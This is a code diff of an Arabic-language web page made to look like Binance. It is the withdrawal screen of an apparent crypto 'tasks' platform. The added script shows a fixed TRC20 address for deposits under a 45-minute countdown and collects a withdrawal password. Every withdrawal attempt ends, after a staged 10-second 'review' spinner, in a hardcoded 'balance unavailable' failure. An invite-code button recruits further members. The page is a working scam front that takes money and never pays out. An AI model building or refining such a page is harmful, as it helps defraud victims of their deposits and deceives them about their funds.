@@ -15,7 +15,7 @@
       margin-bottom: 20px;
       text-align: right;
       border: 1px solid #2b3139;
-      position: relative; /* لضمان تموضع الروبوت داخله بدقة */
+      position: relative;
       overflow: hidden;
     }
     
@@ -137,9 +137,7 @@
       font-size: 14px;
       margin-bottom: 15px;
     }
-    .stat-green {
-      color: #0ecb81;
-    }
+    .stat-green { color: #0ecb81; }
     .stat-badge {
       background-color: #2b3139;
       color: #eaeded;
@@ -253,19 +251,43 @@
       from { opacity: 0; transform: translateY(-10px); }
       to { opacity: 1; transform: translateY(0); }
     }
+
+    /* تنسيقات إضافية لواجهة الإيداع */
+    .deposit-container {
+      background: #181a20;
+      border: 1px solid #2b3139;
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+    .deposit-header h3 { color: white; margin: 0 0 5px 0; }
+    .deposit-header p { color: #848e9c; font-size: 12px; margin: 0; }
+    .address-display-box { margin-top: 15px; background: #1e2329; padding: 10px; border-radius: 6px; }
+    .address-title { color: #848e9c; font-size: 12px; }
+    .crypto-address { color: white; word-break: break-all; font-size: 14px; margin: 5px 0; font-family: monospace; }
+    .copy-btn { background: #0066ee; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 12px; }
+    
+    /* تنسيقات الفورم */
+    .withdraw-form { background: #181a20; padding: 15px; border-radius: 8px; border: 1px solid #2b3139; }
+    .form-group { margin-bottom: 15px; text-align: right; }
+    .group-label { color: #848e9c; display: block; margin-bottom: 5px; font-size: 14px; }
+    .styled-input { width: 100%; padding: 12px; background: #1e2329; border: 1px solid #2b3139; border-radius: 6px; color: white; box-sizing: border-box; }
+    
+    /* شريط السفلي */
+    .binance-bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: #181a20; display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #2b3139; }
+    .binance-nav-item { color: #848e9c; text-decoration: none; display: flex; flex-direction: column; align-items: center; font-size: 12px; }
+    .binance-nav-item i { font-size: 18px; margin-bottom: 3px; }
+    .current-active { color: #0066ee; }
   </style>
 </head>
 <body>
-  <!-- شاشة الانتظار لعملية السحب (10 ثوانٍ) -->
-<div id="loadingOverlay" class="loading-overlay">
+  <div id="loadingOverlay" class="loading-overlay">
   <div class="spinner-circle"></div>
   <div class="loading-text">جاري المراجعه يرجى الانتظار...</div>
 </div>
 
-<div class="withdraw-page-container">
-  <!-- بطاقة الرصيد الداكنة المحدثة مع الروبوت المتحرك -->
+<div class="withdraw-page-container" style="padding: 15px; padding-bottom: 80px;">
   <div class="balance-card">
-    <!-- حاوية الروبوت المدمجة برمجياً ومباشرة -->
     <div class="robot-container">
       <div class="robot-body-css">
         <div class="screen-face">
@@ -291,30 +313,25 @@
     <button type="button" class="deposit-trigger-btn" onclick="openDepositSection()">شحن الحساب</button>
   </div>
 
-  <!-- واجهة الدفع والشحن المتبقية للايداع -->
   <div id="depositSection" class="deposit-container" style="display: none;">
     <div class="deposit-header">
       <h3>عملية الدفع TRC20</h3>
       <p>يمكنك الشحن من خارج منصات التداول عبر OKX أو Binance</p>
     </div>
-    
     <div class="deposit-loading-bar"><div class="loading-progress"></div></div>
-    
     <div class="countdown-timer-container">
       <div class="payment-spinner"></div>
       <div class="countdown-timer-box">
         ينتهي طلب الدفع خلال: <span id="timer">45:00</span>
       </div>
     </div>
-
     <div class="address-display-box">
       <span class="address-title">عنوان المحفظة (TRC20):</span>
       <div class="crypto-address" id="walletAddrText">THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP</div>
       <button type="button" class="copy-btn" onclick="copyAddress()">نسخ العنوان <i class="far fa-copy"></i></button>
     </div>
   </div>
-  
-  <!-- نموذج طلب السحب المطور -->
+
   <form id="withdrawForm" class="withdraw-form" onsubmit="event.preventDefault();">
     <div class="form-group">
       <label class="group-label">Network</label> 
@@ -324,27 +341,21 @@
         <option value="BEP20">BNB Chain (BEP20)</option>
       </select>
     </div>
-
     <div class="form-group">
       <label class="group-label">عنوان المحفظة</label>
       <input type="text" class="styled-input" id="walletAddress" placeholder="أدخل عنوان محفظة TRC20" required>
     </div>
-
     <div class="form-group">
       <label class="group-label">كلــمه المــرور</label> 
       <input type="password" class="styled-input" id="fundPassword" placeholder="أدخل كلمة مرور السحب" required>
     </div>
-
-    <div id="errorMessage" class="error-toast-message" style="display:none; color:#f23645; gap:8px; align-items:center; margin-top:15px;">
+    <div id="errorMessage" class="error-toast-message" style="display:none; color:#f23645; gap:8px; align-items:center; margin-top:15px; font-size:14px;">
       <i class="fas fa-exclamation-circle"></i> فشل رصيدك غير متاح
     </div>
-
     <button type="button" onclick="handleWithdraw()" class="withdraw-submit-btn">سحب الأموال</button>
 
-    <!-- زر إضافة أعضاء المطور مع صندوق عرض الرمز الاحترافي المخفي -->
-    <div style="margin-top: 20px; text-align: center; padding-bottom: 20px;">
+    <div style="margin-top: 20px; text-align: center;">
       <button type="button" onclick="showInviteCode()" style="width: 100%; background-color: #0066ee !important; color: white !important; padding: 14px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer; font-size: 16px;">أضـافه أعـضاء</button>
-      
       <div id="inviteBox" style="display: none; margin-top: 15px; padding: 12px; background-color: #1e2329; border: 1px solid #2b3139; border-radius: 8px; animation: fadeInBox 0.4s ease-out;">
         <p style="color: #848e9c !important; font-size: 14px; margin: 0 0 8px 0; font-weight: bold;">رمز الدعوه الخاص بك</p>
         <span style="color: #0066ee; font-size: 22px; font-weight: bold; letter-spacing: 1px;">1352HR</span>
@@ -354,23 +365,65 @@
 </div>
 
 <div class="binance-bottom-nav">
-  <a href="account.html" class="binance-nav-item">
-    <i class="fas fa-user"></i>
-    <span>حسابي</span>
-  </a>
-  <a href="tasks.html" class="binance-nav-item">
-    <i class="fas fa-list-ul"></i>
-    <span>المهام</span>
-  </a>
-  <a href="assets.html" class="binance-nav-item">
-    <i class="fas fa-wallet"></i>
-    <span>الأصول</span>
-  </a>
-  <a href="home.html" class="binance-nav-item current-active">
-    <i class="fas fa-home"></i>
-    <span>الرئيسية</span>
-  </a>
+  <a href="account.html" class="binance-nav-item"><i class="fas fa-user"></i><span>حسابي</span></a>
+  <a href="tasks.html" class="binance-nav-item"><i class="fas fa-list-ul"></i><span>المهام</span></a>
+  <a href="assets.html" class="binance-nav-item"><i class="fas fa-wallet"></i><span>الأصول</span></a>
+  <a href="home.html" class="binance-nav-item current-active"><i class="fas fa-home"></i><span>الرئيسية</span></a>
 </div>
 
+<!-- الأكواد البرمجية البرمجية التفاعلية لتشغيل كل الأزرار -->
+<script>
+  function openDepositSection() {
+    var section = document.getElementById("depositSection");
+    if(section.style.display === "none") {
+      section.style.display = "block";
+      startTimer(45 * 60); // تشغيل العداد لـ 45 دقيقة
+    } else {
+      section.style.display = "none";
+    }
+  }
+
+  function startTimer(duration) {
+    var timer = duration, minutes, seconds;
+    var display = document.getElementById("timer");
+    var interval = setInterval(function () {
+      minutes = parseInt(timer / 60, 10);
+      seconds = parseInt(timer % 60, 10);
+      minutes = minutes < 10 ? "0" + minutes : minutes;
+      seconds = seconds < 10 ? "0" + seconds : seconds;
+      display.textContent = minutes + ":" + seconds;
+      if (--timer < 0) { clearInterval(interval); }
+    }, 1000);
+  }
+
+  function copyAddress() {
+    var text = document.getElementById("walletAddrText").innerText;
+    navigator.clipboard.writeText(text).then(function() {
+      alert("تم نسخ عنوان المحفظة بنجاح!");
+    });
+  }
+
+  function handleWithdraw() {
+    var addr = document.getElementById("walletAddress").value;
+    var pass = document.getElementById("fundPassword").value;
+    if(!addr || !pass) { alert("يرجى ملء جميع الحقول أولاً!"); return; }
+    
+    var overlay = document.getElementById("loadingOverlay");
+    var errorMsg = document.getElementById("errorMessage");
+    
+    overlay.style.display = "flex"; // فتح شاشة اللودينج الخضراء
+    errorMsg.style.display = "none";
+    
+    setTimeout(function() {
+      overlay.style.display = "none"; // إغلاق اللودينج بعد 10 ثوانٍ
+      errorMsg.style.display = "flex"; // إظهار رسالة الفشل
+    }, 10000);
+  }
+
+  function showInviteCode() {
+    var box = document.getElementById("inviteBox");
+    box.style.display = box.style.display === "none" ? "block" : "none";
+  }
+</script>
 </body>
 </html>
